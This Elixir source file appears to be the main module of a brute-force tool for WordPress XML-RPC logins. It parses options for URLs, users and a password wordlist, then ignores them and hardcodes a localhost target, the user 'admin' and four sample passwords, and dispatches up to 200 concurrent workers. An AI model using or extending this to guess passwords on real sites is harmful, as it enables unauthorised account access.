defmodule WpXmlrpcry do
  alias WpXmlrpcry.{Options, Progress, Worker, Util}
  #require Reporter

  def main(args) do
    args
    |> parse_args()
    |> process()
  end

  def process(args) do
    IO.puts(Util.banner())

    if args[:help] || missing_main_args(args) do
      IO.puts(Util.help())
      System.halt(0)
    end

    urls = ["http://localhost:8080/xmlrpc.php"]
    users = ["admin"]
    wordlist = ["123456", "admin123@123", "12345640", "awieqwe"]
    total = Enum.count(urls)
    progress_channel = Progress.start_progress(finished: 0, total: total)

    Task.async_stream(
      urls,
      &(Worker.start(progress_channel, url: &1, users: users, wordlist: wordlist)),
      max_concurrency: 200,
      timeout: :infinity,
      ordered: false
    ) |> Stream.run()
  end

  defp parse_args(args) do
    {parsed, _argv, _} = OptionParser.parse(args,
      switches: [
        urls: :string,
        concurrency: :integer,
        wordlist: :string,
        users: :string,
        output: :string,
        help: :boolean
      ],
      aliases: [u: :urls, w: :wordlist, c: :concurrency, h: :help, o: :output]
    )

    parsed
  end

  defp missing_main_args(args) do
    [args[:urls], args[:users], args[:wordlist]]
    |> Enum.map(&is_nil/1)
    |> Enum.any?
  end
end
